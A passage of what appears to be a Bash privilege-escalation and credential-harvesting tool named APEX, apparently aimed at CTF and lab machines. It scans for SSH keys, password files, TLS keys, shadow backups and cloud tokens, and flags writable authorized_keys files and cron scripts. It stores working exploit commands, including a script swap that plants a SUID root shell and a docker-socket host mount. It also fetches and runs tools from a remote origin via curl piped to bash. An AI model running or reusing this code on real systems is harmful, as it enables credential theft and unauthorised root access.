        "$HOME/.password-store" "Unix `pass` store present" 60 "cred_pwmgr"
    # 1Password / Bitwarden hints
    [ -f "$HOME/.config/op/config" ] && register_finding "1PASSWORD_CONFIG" \
        "$HOME/.config/op/config" "1Password CLI config present" 40 "cred_pwmgr"
}

scan_network_app_credentials() {
    local f
    for f in "$HOME/.netrc" /root/.netrc "$HOME/.curlrc" "$HOME/.wgetrc"; do
        [ -r "$f" ] && register_finding "NETRC_LIKE" "$f" \
            "Network creds file readable: $f" 75 "cred_net"
    done
    # NetworkManager profile files
    if [ -d /etc/NetworkManager/system-connections ]; then
        apex_find /etc/NetworkManager/system-connections -type f 2>/dev/null | \
        while IFS= read -r f; do
            [ -r "$f" ] && register_finding "NM_CONNECTION" "$f" \
                "NetworkManager connection readable: $f" 65 "cred_net"
        done
    fi
    # /etc/fstab credentials= reference
    if [ -r /etc/fstab ]; then
        grep -E "credentials=|username=|password=" /etc/fstab 2>/dev/null | \
        while IFS= read -r line; do
            register_finding "FSTAB_CRED" "/etc/fstab" \
                "fstab references credentials: $(printf '%s' "$line" | cut -c1-160)" \
                70 "cred_net"
        done
    fi
}

scan_ssl_tls_material() {
    # Look in common locations only (system-wide find is expensive — Engine 2
    # can deep-read specific targets).
    local d f
    for d in /etc/ssl/private /etc/ssl /etc/pki /etc/letsencrypt /etc/openvpn \
             /etc/strongswan /etc/ipsec.d; do
        [ -d "$d" ] || continue
        apex_find "$d" -maxdepth 5 -type f \
            \( -name "*.key" -o -name "*.pem" -o -name "*.p12" -o -name "*.pfx" \
               -o -name "*.jks" -o -name "*.ovpn" \) 2>/dev/null | head -20 | \
        while IFS= read -r f; do
            [ -r "$f" ] || continue
            if grep -q "BEGIN.*PRIVATE KEY" "$f" 2>/dev/null; then
                register_finding "SSL_PRIVATE_KEY" "$f" \
                    "Readable SSL/TLS private key: $f" 82 "cred_ssl"
            fi
            case "$f" in
                *.ovpn) register_finding "VPN_CONFIG" "$f" \
                    "OpenVPN config readable: $f" 70 "cred_ssl" ;;
                *.jks|*.p12|*.pfx) register_finding "JAVA_KEYSTORE" "$f" \
                    "Java keystore readable: $f" 70 "cred_ssl" ;;
            esac
        done
    done
}

scan_hot_files() {
    # Per-home hot-file list. Keeps coverage tight (no system-wide find).
    local home_dirs="/root $HOME"
    if [ -r /etc/passwd ]; then
        local home
        while IFS=: read -r _ _ uid _ _ home _; do
            case "$uid" in ''|*[!0-9]*) continue ;; esac
            [ "$uid" -ge 1000 ] && home_dirs="$home_dirs $home"
        done < /etc/passwd
    fi
    home_dirs=$(printf '%s\n' $home_dirs | sort -u | tr '\n' ' ')
    local HOT=".aws/credentials .azure/azureProfile.json .boto .docker/config.json .erlang.cookie .ftpconfig .git-credentials .gitconfig .gnupg .htpasswd .kdbx .kube/config .ldaprc .msmtprc .mylogin.cnf .netrc .npmrc .password-store .pgpass .pypirc .rhosts .ssh/config .vault-token .viminfo .wgetrc .Xauthority"
    local h hf t
    for h in $home_dirs; do
        [ -d "$h" ] || continue
        for hf in $HOT; do
            t="$h/$hf"
            if [ -e "$t" ] && [ -r "$t" ]; then
                register_finding "HOT_FILE" "$t" "Hot file present: $t" 55 "cred_hot"
            fi
        done
    done
}

scan_password_files() {
    # Direct password leaks: world-readable shadow-like files, passwd backups.
    local f
    for f in /etc/shadow- /etc/shadow.bak /var/backups/shadow.bak; do
        [ -r "$f" ] || continue
        # Verify it actually contains hashes (not just a plain passwd backup)
        if grep -qE '^[^:]+:\$[0-9a-z]+\$' "$f" 2>/dev/null; then
            register_finding "SHADOW_BACKUP" "$f" \
                "Shadow backup with hashes readable: $f — crack with hashcat/john" 88 "cred_passwd_backup"
        else
            register_finding "SHADOW_BACKUP" "$f" \
                "Shadow backup file readable (no hashes found): $f" 40 "cred_passwd_backup"
        fi
    done
    for f in /etc/passwd- /etc/passwd.bak /var/backups/passwd.bak; do
        [ -r "$f" ] && register_finding "SHADOW_BACKUP" "$f" \
            "Passwd backup readable (no password hashes — informational): $f" 25 "cred_passwd_backup"
    done
    # Apache htpasswd files in standard webroots
    for f in /etc/apache2/.htpasswd /etc/nginx/.htpasswd /etc/lighttpd/.htpasswd \
             /var/www/.htpasswd /var/www/html/.htpasswd; do
        [ -r "$f" ] && register_finding "HTPASSWD" "$f" \
            "htpasswd file readable: $f" 70 "cred_passwd"
    done
}

check_authorized_keys_injectable() {
    # Specifically check every authorized_keys path we can possibly inject.
    # Skips own-user dirs (not privesc). Downgrades if AuthorizedKeysCommand set.
    [ -r /etc/passwd ] || return 0
    local user uid home authk
    while IFS=: read -r user _ uid _ _ home _; do
        case "$uid" in ''|*[!0-9]*) continue ;; esac
        [ -d "$home" ] || continue
        authk="$home/.ssh/authorized_keys"
        if [ -f "$authk" ] && verify_actually_writable "$authk" 2>/dev/null; then
            local base_conf=90
            [ "$uid" -eq 0 ] && base_conf=99
            local conf
            conf=$(_authkeys_inject_conf "$authk" "$base_conf")
            [ "$conf" -lt 15 ] && continue
            register_finding "AUTHKEYS_INJECT" "$authk" \
                "authorized_keys writable for user $user (uid=$uid)" \
                "$conf" "cred_ssh_inject"
        elif [ -d "$home/.ssh" ] && verify_actually_writable "$home/.ssh" 2>/dev/null; then
            local conf
            conf=$(_authkeys_inject_conf "$home/.ssh" 87)
            [ "$conf" -lt 15 ] && continue
            register_finding "AUTHKEYS_DIR_INJECT" "$home/.ssh" \
                ".ssh dir writable for $user" "$conf" "cred_ssh_inject"
        elif [ -d "$home" ] && verify_actually_writable "$home" 2>/dev/null && [ ! -d "$home/.ssh" ]; then
            local conf
            conf=$(_authkeys_inject_conf "$home" 82)
            [ "$conf" -lt 15 ] && continue
            register_finding "HOME_INJECT" "$home" \
                "Home dir writable for $user — create .ssh/authorized_keys" \
                "$conf" "cred_ssh_inject"
        fi
    done < /etc/passwd
}

propagate_credential() {
    # Light-touch DNA — heavy testing belongs to Layer 3. Here we just record
    # that a credential should be propagated and store hints.
    local user="${1:-}"
    local pass="${2:-}"
    local kind="${3:-}"
    local src="${4:-}"
    [ -z "$pass" ] && return 0
    register_finding "CRED_DNA" "$src" \
        "Credential found (user=$user kind=$kind) — propagation queued" \
        60 "cred_dna"
}

pspy_smart_parser() {
    local pspy_file="$1"
    [ -f "$pspy_file" ] && [ -s "$pspy_file" ] || return 1
    local our_uid
    our_uid=$(id -u)
    local uid_map
    uid_map=$(awk -F: '{print $3"="$1}' /etc/passwd 2>/dev/null)
    _uid_to_name() {
        printf '%s' "$uid_map" | awk -F= -v u="$1" '$1==u{print $2; exit}'
    }
    while IFS= read -r line; do
        line=$(printf '%s' "$line" | sed 's/\x1b\[[0-9;]*m//g')
        local proc_uid proc_pid proc_cmd
        proc_uid=$(printf '%s' "$line" | grep -oE 'UID=[0-9]+' | head -1 | cut -d= -f2)
        proc_pid=$(printf '%s' "$line" | grep -oE 'PID=[0-9]+' | head -1 | cut -d= -f2)
        # pspy format: "... CMD: UID=0   PID=N   | actual command here"
        # Extract what's AFTER the " | " separator — that's the real command.
        # Without this, proc_cmd = "UID=0   PID=10" and first_word = "UID=0"
        # which falsely triggers PSPY_ROOT_RELATIVE_CMD for every kernel thread.
        if printf '%s' "$line" | grep -q ' | '; then
            proc_cmd=$(printf '%s' "$line" | sed 's/.*| //')
        else
            proc_cmd=$(printf '%s' "$line" | sed 's/.*CMD: //')
        fi
        [ -z "$proc_uid" ] || [ -z "$proc_cmd" ] && continue
        [ "$proc_uid" = "$our_uid" ] && continue
        # Skip PID=1 (systemd/init), low PIDs 2-15 (kernel threads), and known
        # kernel thread names including bracket notation "[kworker/0:1]".
        [ "$proc_pid" = "1" ] && continue
        { [ -n "$proc_pid" ] && [ "$proc_pid" -le 15 ]; } 2>/dev/null && continue
        case "$proc_cmd" in
            \[*\])          continue ;;  # kernel thread bracket form [kworker/0:1]
            systemd|kthreadd|kworker*|ksoftirqd*|rcu_*|watchdog*|migration*) continue ;;
        esac
        # pspy shows "processname: /full/path args" for child processes — the part
        # before ": " is the parent process name, NOT a relative command. Skip.
        local first_word_tmp
        first_word_tmp=$(printf '%s' "$proc_cmd" | awk '{print $1}')
        case "$first_word_tmp" in *:) continue ;; esac
        local run_user
        run_user=$(_uid_to_name "$proc_uid")
        printf '%s' "$proc_cmd" | grep -oE '/[a-zA-Z0-9._/-]{3,}' | while IFS= read -r fpath; do
            [ -f "$fpath" ] || [ -d "$fpath" ] || continue
            if verify_actually_writable "$fpath" 2>/dev/null; then
                local ftype="PSPY_WRITABLE_EXEC_LATERAL"
                [ "$proc_uid" = "0" ] && ftype="PSPY_ROOT_EXEC_WRITABLE"
                register_finding "$ftype" "$fpath" \
                    "uid=$proc_uid ($run_user) executes writable path: $(safe_output "$proc_cmd" | cut -c1-150)" \
                    99 "pspy_dynamic"
            else
                # GAP 1: directory-based hijack — file itself not writable, but
                # its parent dir is, so we can rm+recreate (delete-and-replace).
                # This is the layne→scott case: bankSmarter_backup.sh is owned
                # by scott, but /home/layne.stanley/ is 0777 → layne can swap
                # the file. cron next firing executes the attacker's script.
                local fdir
                fdir=$(dirname -- "$fpath" 2>/dev/null)
                [ -n "$fdir" ] && [ -d "$fdir" ] || continue
                # Only flag if it's actually a delete-and-replace win.
                if verify_actually_writable "$fdir" 2>/dev/null; then
                    local dtype="PSPY_DIR_HIJACK"
                    [ "$proc_uid" = "0" ] && dtype="PSPY_DIR_HIJACK_ROOT"
                    register_finding "$dtype" "$fpath" \
                        "uid=$proc_uid ($run_user) runs $fpath — FILE not writable but PARENT DIR $fdir IS (delete+recreate hijack)" \
                        95 "pspy_dir_hijack"
                    register_exploit "$dtype" "$fpath" \
                        "rm -f $fpath; printf '#!/bin/bash -p\ncp /bin/bash ${APEX_EXEC_DIR:-/tmp}/rootbash; chmod 4755 ${APEX_EXEC_DIR:-/tmp}/rootbash\n' > $fpath; chmod +x $fpath; sleep 65; ${APEX_EXEC_DIR:-/tmp}/rootbash -p"
                fi
            fi
        done
        if printf '%s' "$proc_cmd" | grep -qE '^/bin/sh -c|^/usr/bin/sh -c'; then
            local inner_cmd inner_path
            inner_cmd=$(printf '%s' "$proc_cmd" | sed "s|^.*/sh -c ||" | tr -d "\"'")
            inner_path=$(printf '%s' "$inner_cmd" | awk '{print $1}')
            if [ -n "$inner_path" ] && verify_actually_writable "$inner_path" 2>/dev/null; then
                register_finding "PSPY_CRON_WRITABLE_CMD" "$inner_path" \
                    "Cron uid=$proc_uid/$run_user executes writable: $(safe_output "$inner_cmd" | cut -c1-150)" \
                    99 "pspy_cron"
            fi
        fi
        if printf '%s' "$proc_cmd" | grep -qiE '(-p [^-][^ ]*|--password[= ][^ ]+|://[^:]+:[^@]+@)'; then
            local cred_hit
            cred_hit=$(printf '%s' "$proc_cmd" | grep -oiE '(-p [^-][^ ]*|--password=[^ ]+|://[^@]+@[^ "]+)' | head -1)
            register_finding "PSPY_CMDLINE_CRED" "/proc" \
                "Credential in cmdline uid=$proc_uid: $(safe_output "$cred_hit")" \
                88 "pspy_cred"
        fi
        if [ "$proc_uid" = "0" ]; then
            local first_word
            first_word=$(printf '%s' "$proc_cmd" | awk '{print $1}')
            if [ -n "$first_word" ] && ! printf '%s' "$first_word" | grep -q '^/'; then
                register_finding "PSPY_ROOT_RELATIVE_CMD" "/proc" \
                    "Root runs relative cmd PATH hijack: $(safe_output "$proc_cmd" | cut -c1-120)" \
                    70 "pspy_path"
            fi
        fi
        if printf '%s' "$proc_cmd" | grep -q 'inotifywait'; then
            local watched_path
            watched_path=$(printf '%s' "$proc_cmd" | grep -oE '/[a-zA-Z0-9._/-]+' | tail -1)
            if [ -n "$watched_path" ] && verify_actually_writable "$watched_path" 2>/dev/null; then
                register_finding "PSPY_INOTIFY_WATCHES_WRITABLE" "$watched_path" \
                    "inotifywait monitors writable path: $(safe_output "$proc_cmd" | cut -c1-120)" \
                    85 "pspy_inotify"
            fi
        fi
    done < "$pspy_file"
}

# GAP 2: start pspy IN BACKGROUND at scan init so it runs in parallel with the
# static layers and never gets skipped by adaptive layer 6 logic. The user
# asked: pspy must ALWAYS run, never be optimised away. ~70s collection window
# means we catch minute-cron jobs reliably.
apex_pspy_bg_start() {
    [ -n "$APEX_TMP" ] && [ -d "$APEX_TMP" ] || return 1
    apex_detect_origin
    apex_find_exec_dir

    local pspy_bin=""
    local cand

    # 1. Fixed well-known paths (fastest)
    for cand in \
        "${APEX_DIR:-}/bin/pspy64" "${APEX_DIR:-}/bin/pspy32" \
        /usr/local/bin/pspy64 /usr/local/bin/pspy32 /usr/local/bin/pspy \
        /usr/bin/pspy64 /usr/bin/pspy32 /usr/bin/pspy \
        /opt/pspy64 /opt/pspy32 /opt/pspy \
        /tmp/pspy64 /tmp/pspy32 /tmp/pspy \
        /dev/shm/pspy64 /dev/shm/pspy32 /dev/shm/pspy
    do
        [ -n "$cand" ] && [ -x "$cand" ] && { pspy_bin="$cand"; break; }
    done

    # 2. PATH lookup
    [ -z "$pspy_bin" ] && cand=$(command -v pspy 2>/dev/null) && [ -x "$cand" ] && pspy_bin="$cand"
    [ -z "$pspy_bin" ] && cand=$(command -v pspy64 2>/dev/null) && [ -x "$cand" ] && pspy_bin="$cand"

    # 3. Broad filesystem search — find any pspy binary in reachable writable/exec dirs
    if [ -z "$pspy_bin" ]; then
        cand=$(find /tmp /dev/shm /var/tmp /run/user \
            -maxdepth 3 -name 'pspy*' -type f -executable 2>/dev/null | head -1)
        [ -n "$cand" ] && [ -x "$cand" ] && pspy_bin="$cand"
    fi
    # 4. Search home dirs (CTF/lab boxes often have pspy in a user's home)
    if [ -z "$pspy_bin" ]; then
        cand=$(find /home /root \
            -maxdepth 4 -name 'pspy*' -type f -executable 2>/dev/null | head -1)
        [ -n "$cand" ] && [ -x "$cand" ] && pspy_bin="$cand"
    fi

    APEX_PSPY_BG_OUT="$APEX_TMP/pspy_bg_$$"

    if [ -n "$pspy_bin" ]; then
        ( safe_run 70 "$pspy_bin" -p 2>/dev/null | head -2000 > "$APEX_PSPY_BG_OUT" ) &
        APEX_PSPY_BG_PID=$!
        return 0
    fi

    # Try the origin-download path (if invoked via curl IP:PORT/apex.sh|bash).
    if [ -n "$APEX_ORIGIN_BASE" ] && [ -n "$APEX_EXEC_DIR" ]; then
        local pspy_name dl
        pspy_name=$(apex_select_pspy_arch)
        dl="$APEX_EXEC_DIR/.${pspy_name}_$$"
        register_tempfile "$dl"
        if apex_download_tool "$pspy_name" "$dl"; then
            chmod +x "$dl" 2>/dev/null
            ( safe_run 70 "$dl" -p 2>/dev/null | head -2000 > "$APEX_PSPY_BG_OUT"
              rm -f "$dl" 2>/dev/null ) &
            APEX_PSPY_BG_PID=$!
            return 0
        fi
        rm -f "$dl" 2>/dev/null
    fi

    # GAP 6: nothing worked — make it loud so the operator knows pspy is OFF
    # and can re-invoke via `bash <(curl http://IP:PORT/apex.sh)` to enable
    # the auto-download path. Do NOT silently continue without telling them.
    APEX_PSPY_BG_OUT=""
    APEX_PSPY_BG_PID=""
    if [ -z "$APEX_ORIGIN_BASE" ]; then
        printf '[!] pspy: no local binary found and no HTTP origin detected.\n' >&2
        printf '    For dynamic detection (cron-hijack, minute-jobs), re-run via:\n' >&2
        printf '      bash <(curl -fsSL http://YOUR_IP:PORT/apex.sh)\n' >&2
        printf '    Static analysis will continue without pspy.\n' >&2
    elif [ -z "$APEX_EXEC_DIR" ]; then
        printf '[!] pspy: origin detected (%s) but no writable+exec dir available.\n' "$APEX_ORIGIN_BASE" >&2
        printf '    All candidate dirs (/dev/shm /run/user/UID /tmp /var/tmp $HOME) are noexec or read-only.\n' >&2
    fi
    return 1
}

apex_pspy_bg_wait_and_parse() {
    [ -n "$APEX_PSPY_BG_PID" ] || return 1
    # Best-effort wait. The background job is capped by `safe_run 70` so it
    # cannot run forever; we still bound the wait to keep main() from hanging
    # on a corrupted pspy.
    wait "$APEX_PSPY_BG_PID" 2>/dev/null
    APEX_PSPY_BG_PID=""
    [ -s "$APEX_PSPY_BG_OUT" ] || { rm -f "$APEX_PSPY_BG_OUT" 2>/dev/null; APEX_PSPY_BG_OUT=""; return 1; }
    pspy_smart_parser "$APEX_PSPY_BG_OUT"
    rm -f "$APEX_PSPY_BG_OUT" 2>/dev/null
    APEX_PSPY_BG_OUT=""
    return 0
}

parse_lse_output() {
    local f="$1"
    [ -f "$f" ] || return 1
    sed 's/\x1b\[[0-9;]*m//g' "$f" | grep -E '^\[!\]' | head -50 | while IFS= read -r line; do
        local clean
        clean=$(printf '%s' "$line" | sed 's/^\[!\] *//')
        [ -n "$clean" ] || continue
        register_finding "LSE_CRITICAL" "lse" \
            "LSE: $(safe_output "$clean" | cut -c1-160)" 68 "tool_lse"
    done
    sed 's/\x1b\[[0-9;]*m//g' "$f" | grep -iE 'NOPASSWD|sudoers' | head -10 | while IFS= read -r line; do
        register_finding "LSE_SUDO" "lse" \
            "LSE sudo: $(safe_output "$line" | cut -c1-160)" 82 "tool_lse"
    done
}

tool_orchestrator() {
    [ -n "$APEX_ORIGIN_BASE" ] || return 0
    [ -n "$APEX_EXEC_DIR" ] || return 0
    local pspy_out="$APEX_TMP/pspy_raw_$$"
    local lse_out="$APEX_TMP/lse_raw_$$"
    {
        local pspy_name pspy_bin
        pspy_name=$(apex_select_pspy_arch)
        pspy_bin="$APEX_EXEC_DIR/.${pspy_name}_$$"
        register_tempfile "$pspy_bin"
        if apex_download_tool "$pspy_name" "$pspy_bin"; then
            chmod +x "$pspy_bin" 2>/dev/null
            safe_run 70 "$pspy_bin" -p 2>/dev/null | head -2000 > "$pspy_out"
            rm -f "$pspy_bin"
        else
            rm -f "$pspy_bin"
        fi
    } &
    local pspy_job=$!
    local lse_job=""
    local current_findings
    current_findings=$(_finding_count)
    if [ "${current_findings:-0}" -lt 5 ]; then
        {
            local lse_bin="$APEX_EXEC_DIR/.lse_$$"
            register_tempfile "$lse_bin"
            if apex_download_tool "lse.sh" "$lse_bin"; then
                chmod +x "$lse_bin" 2>/dev/null
                safe_run 90 bash "$lse_bin" -l 2 -i 2>/dev/null > "$lse_out"
                rm -f "$lse_bin"
            else
                rm -f "$lse_bin"
            fi
        } &
        lse_job=$!
    fi
    wait "$pspy_job" 2>/dev/null
    [ -n "$lse_job" ] && wait "$lse_job" 2>/dev/null
    [ -s "$pspy_out" ] && pspy_smart_parser "$pspy_out"
    rm -f "$pspy_out"
    [ -s "$lse_out" ] && parse_lse_output "$lse_out"
    rm -f "$lse_out"
    rm -f "$APEX_TMP/tool_status_$$"
}

scan_bash_history() {
    # D13: Analyze bash_history for lateral pivot signals beyond generic creds.
    # 5 signal types: unix socket connects, ssh-keygen, root cross-home ops,
    # script replace pattern, inline credentials.
    local histfile="${HOME:-/home/$(id -un)}/.bash_history"
    [ -r "$histfile" ] || return 0
    [ -s "$histfile" ] || return 0

    local body
    body=$(head -c 131072 "$histfile" 2>/dev/null)
    [ -z "$body" ] && return 0

    # Signal 1: Unix socket connections (socat/nc to .sock files)
    # High confidence — this is a deliberate lateral pivot command in history
    printf '%s\n' "$body" | grep -E '(socat|nc|ncat).*\.sock|unix-connect:|unix-listen:' | head -10 | \
    while IFS= read -r line; do
        local sockpath
        sockpath=$(printf '%s' "$line" | grep -oE '[^ ]+\.sock' | head -1)
        register_finding "HISTORY_UNIX_SOCKET" "$histfile" \
            "PIVOT: unix socket command in history: $(safe_output "$line" | cut -c1-200)" \
            85 "history_pivot"
        # Embed the actual command for use as exploit
        register_exploit "HISTORY_UNIX_SOCKET" "$histfile" \
            "$(safe_output "$line")"
        if [ -n "$sockpath" ] && [ -e "$sockpath" ]; then
            register_finding "HISTORY_UNIX_SOCKET_EXISTS" "$sockpath" \
                "Unix socket from history STILL EXISTS: $sockpath — $(safe_output "$line" | cut -c1-120)" \
                92 "history_pivot"
            register_exploit "HISTORY_UNIX_SOCKET_EXISTS" "$sockpath" \
                "$(safe_output "$line")"$'\n'"# Socket confirmed live: socat stdio unix-connect:$sockpath"
        fi
    done

    # Signal 2: ssh-keygen in history — reveals where keys were stored
    printf '%s\n' "$body" | grep -E 'ssh-keygen' | head -5 | \
    while IFS= read -r line; do
        register_finding "HISTORY_SSH_KEYGEN" "$histfile" \
            "ssh-keygen in history (key location hints): $(safe_output "$line" | cut -c1-200)" \
            50 "history_pivot"
    done

    # Signal 3: Root cross-home operations (root accessed another user's home)
    printf '%s\n' "$body" | grep -E '(sudo|su[[:space:]]|su$).*cp |sudo.*mv |sudo.*cat /home/|sudo.*cat /root/' | head -10 | \
    while IFS= read -r line; do
        register_finding "HISTORY_ROOT_CROSS_HOME" "$histfile" \
            "Root cross-home operation in history: $(safe_output "$line" | cut -c1-200)" \
            65 "history_pivot"
    done

    # Signal 4: Script replace pattern — must look like an actual file swap, not just
    # any line containing "cp" or "mv". Require: backup extension (.bak/.orig/.old)
    # combined with overwrite, OR rm+cp on same line implying replacement.
    printf '%s\n' "$body" | grep -E \
        '(rm[[:space:]].*&&[[:space:]]*cp[[:space:]]|mv[[:space:]].*\.(bak|orig|old)[[:space:]]*&&|cp[[:space:]].*&&[[:space:]]*chmod[[:space:]]+[0-9]*[4-7][0-9][0-9])' | \
        grep -vE '^#|^\s*#' | head -5 | \
    while IFS= read -r line; do
        register_finding "HISTORY_SCRIPT_REPLACE" "$histfile" \
            "Script replace pattern in history (possible backdoor): $(safe_output "$line" | cut -c1-200)" \
            72 "history_pivot"
    done

    # Signal 5: Inline credentials (passwords in command args)
    printf '%s\n' "$body" | grep -iE '(password|passwd|--pass|-p[[:space:]]+[^-])' | \
        grep -vE '^#' | head -10 | \
    while IFS= read -r line; do
        register_finding "HISTORY_INLINE_CRED" "$histfile" \
            "Possible credential in history: $(safe_output "$line" | cut -c1-200)" \
            75 "history_cred"
    done
}

scan_unix_sockets() {
    # D13: Find accessible unix domain sockets — lateral pivot to other users/services.
    local me
    me=$(id -un 2>/dev/null)

    # System socket dirs
    local sock_dirs="/tmp /run /var/run /opt /srv /home"
    local d
    for d in $sock_dirs; do
        [ -d "$d" ] || continue
        apex_find "$d" -type s -maxdepth 5 2>/dev/null | while IFS= read -r sock; do
            [ -r "$sock" ] || [ -w "$sock" ] || continue
            local sock_owner sock_group
            sock_owner=$(stat -c '%U' "$sock" 2>/dev/null)
            sock_group=$(stat -c '%G' "$sock" 2>/dev/null)
            [ "$sock_owner" = "$me" ] && continue  # own socket = skip
            # Docker/containerd sockets = instant root
            case "$sock" in
                */docker.sock|*/containerd.sock|*/podman.sock)
                    register_finding "UNIX_SOCK_DOCKER" "$sock" \
                        "Container daemon socket accessible: $sock (owned by $sock_owner) — instant root" \
                        97 "unix_socket"
                    register_exploit "UNIX_SOCK_DOCKER" "$sock" \
                        "docker -H unix://$sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
                    continue
                    ;;
            esac
            # Application sockets — lateral pivot. Boost confidence when the
            # invoking user is in the socket's owning group (chmod 660 unix
            # socket → group members can speak to it without authentication).
            local _sock_conf=65
            if [ -n "$sock_group" ] && id -Gn 2>/dev/null | tr ' ' '\n' | grep -qxF "$sock_group"; then
                _sock_conf=85
            fi
            register_finding "UNIX_SOCK_LATERAL" "$sock" \
                "Unix socket accessible (owner=$sock_owner group=$sock_group): $sock — lateral pivot possible" \
                "$_sock_conf" "unix_socket"
            register_exploit "UNIX_SOCK_LATERAL" "$sock" \
                "socat stdio unix-connect:$sock"
        done
    done

    # /proc unix sockets — cross-ref with inode to find accessible ones
    if [ -r /proc/net/unix ]; then
        awk 'NR>1 && $NF~/^\// {print $NF}' /proc/net/unix 2>/dev/null | \
        sort -u | while IFS= read -r sockpath; do
            [ -e "$sockpath" ] || continue
            [ -r "$sockpath" ] || [ -w "$sockpath" ] || continue
            local sp_owner
            sp_owner=$(stat -c '%U' "$sockpath" 2>/dev/null)
            [ "$sp_owner" = "$me" ] && continue
            # Avoid re-reporting what apex_find already found
            case "$sockpath" in
                /tmp/*|/run/*|/var/run/*|/opt/*|/srv/*|/home/*) continue ;;
            esac
            register_finding "UNIX_SOCK_PROC" "$sockpath" \
                "Active unix socket from /proc/net/unix (owner=$sp_owner): $sockpath" \
                60 "unix_socket"
        done
    fi
}

run_credential_hunt() {
    # Orchestrator. Runs all sub-scanners. Parallelism is fine because each
    # writes through register_finding() — which is atomic per-file.
    scan_ssh_artifacts                  &
    scan_history_files                  &
    scan_process_environ                &
    scan_cloud_credentials              &
    scan_container_secrets              &
    scan_database_credentials           &
    scan_git_credentials                &
    scan_password_managers              &
    scan_network_app_credentials        &
    scan_ssl_tls_material               &
    scan_hot_files                      &
    scan_password_files                 &
    check_authorized_keys_injectable    &
    scan_bash_history                   &
    scan_unix_sockets                   &
    wait
    return 0
}


# =============================================================================
# SECTION 6 — Engine 2: Deep Reader (Chain Following)
# =============================================================================
# Deep reader takes Engine 1 findings and follows them down — reads scripts,
# unit files, configs, binaries. Three guards: depth, visited set, time budget.

read_deeply() {
    # Three guards:
    #   1. Depth      — bound recursion (READER_MAX_DEPTH, default 5)
    #   2. Visited    — never revisit same inode (READER_VISITED)
    #   3. Time budget — abort if elapsed > READER_MAX_TIME (default 60s,
    #                    spec says 30s — we honour whichever is smaller)
    # Args:   <file> [depth]
    # Caller may pre-set READER_MAX_TIME=30 to enforce the Phase-4 budget.

    local target="${1:-}"
    local depth="${2:-0}"
    [ -z "$target" ] && return 0
    [ -e "$target" ] || return 0

    # ── Guard 0: self-script suppression ──────────────────────────────────────
    # APEX writes its own runner / per-user copies / staged tools into /tmp and
    # /dev/shm. Reading them confuses every downstream lens (DEEP_HEREDOC,
    # DEEP_SHELL, FOREIGN_FILE) into reporting our own artefacts as exploit
    # surface. Drop these unconditionally — they are never the privesc path.
    case "$target" in
        /tmp/apex_*|/tmp/apex.sh|/tmp/trace_*|/tmp/.apex_*|/tmp/_apex_*|/tmp/sh-thd*|\
        /dev/shm/.apex_*|/dev/shm/apex_*|/dev/shm/.les*|/dev/shm/.linpeas*|\
        /dev/shm/.pspy*|/dev/shm/.lse*|/dev/shm/.linenum*|\
        */apex.sh|*/apex_*.sh|\
        */.apex_*)
            return 0 ;;
    esac

    # ── Guard 1: depth ────────────────────────────────────────────────────────
    if [ "$depth" -ge "${READER_MAX_DEPTH:-5}" ]; then
        return 0
    fi

    # ── Guard 3: time budget ──────────────────────────────────────────────────
    # Initialise the start clock on the first (top-level) call so the budget
    # applies to the whole tree from a single root, not per-recursion.
    local now
    now=$(date +%s 2>/dev/null)
    if [ "${READER_START_TIME:-0}" -eq 0 ] || [ "$depth" -eq 0 ]; then
        READER_START_TIME="$now"
        # Top-level call also resets the visited set so independent roots
        # don't poison each other.
        READER_VISITED=""
    fi
    local budget="${READER_MAX_TIME:-60}"
    [ "$budget" -lt 30 ] && budget=30
    if [ "$(( now - READER_START_TIME ))" -ge "$budget" ]; then
        return 0
    fi

    # ── Guard 2: visited set (by inode, not path — handles symlinks) ──────────
    local ino
    ino=$(apex_stat "$target" mtime 2>/dev/null)   # mtime not ideal; below we use real inode
    # Use ls -i to get the inode portably.
    ino=$({ ls -di -- "$target"; } 2>/dev/null | awk '{print $1}')
    [ -z "$ino" ] && ino="$target"
    case "$READER_VISITED" in
        *":${ino}:"*) return 0 ;;
    esac
    READER_VISITED="${READER_VISITED}:${ino}:"

    # ── Dispatch by file type ────────────────────────────────────────────────
    # We trust the path/extension first (cheap), then file(1) if available.
    local base
    base=$(basename -- "$target")

    case "$target" in
        */crontab|*/cron.d/*|*/cron.daily/*|*/cron.weekly/*|*/cron.monthly/*|*/cron.hourly/*|*/periodic/*/*)
            analyze_cron_file "$target" "$depth"
            return 0
            ;;
        *.service|*.timer|*.socket|*.path|*.mount|*.target)
            analyze_unit_file "$target" "$depth"
            return 0
            ;;
        *.py)
            analyze_python_script "$target" "$depth"
            return 0
            ;;
        *.sh|*.bash|*.zsh|*.ksh|*.dash|*.ash)
            analyze_shell_script "$target" "$depth"
            return 0
            ;;
        *.conf|*.cfg|*.ini|*.yaml|*.yml|*.toml|*.properties|*.env|*.json|*.xml)
            analyze_config_file "$target" "$depth"
            return 0
            ;;
    esac

    case "$base" in
        crontab|.bashrc|.profile|.bash_profile|.zshrc)
            analyze_shell_script "$target" "$depth"
            return 0
            ;;
    esac

    # No extension hint — sniff the file.
    if [ -f "$target" ] && [ -r "$target" ]; then
        # ELF magic check via od (avoids binary nulls in shell variable → "ignored null byte" warning)
        local magic
        magic=$(od -An -c -N4 -- "$target" 2>/dev/null | tr -s ' ' | head -c 32)
        case "$magic" in
            *'177'*'E'*'L'*'F'*) analyze_binary_strings "$target" "$depth"; return 0 ;;
        esac
        # Shebang via line 1 only (no nulls in scripts)
        local shebang
        IFS= read -r shebang < "$target" 2>/dev/null || shebang=""
        case "$shebang" in
            '#!'*python*) analyze_python_script "$target" "$depth"; return 0 ;;
            '#!'*)        analyze_shell_script "$target" "$depth";  return 0 ;;
        esac
        # Text content sniff — read 256 bytes, strip nulls to prevent bash warnings.
        local first
        first=$({ head -c 256 -- "$target" 2>/dev/null | tr -d '\0'; } 2>/dev/null)
        case "$first" in
            *'[Unit]'*) analyze_unit_file "$target" "$depth"; return 0 ;;
            *'PATH='*|*'* * *'*) analyze_cron_file "$target" "$depth"; return 0 ;;
        esac
        # Fallback: treat as config (key=value style).
        analyze_config_file "$target" "$depth"
        return 0
    fi

    return 0
}
analyze_shell_script() {
    # Patterns of interest:
    #   - `source FILE` / `. FILE`              → recurse into FILE
    #   - `eval "$VAR"` / `eval $VAR`           → injection if VAR is influenceable
    #   - bare command (no leading /)           → PATH hijack candidate
    #   - heredoc (<<MARKER ... MARKER)         → MEDIUM-4: extract + re-analyze
    #   - per-line `PATH=` assignment           → PATH override
    #   - `CMD=$1; $CMD`                        → arg-as-command pattern
    local script="${1:-}"
    local depth="${2:-0}"
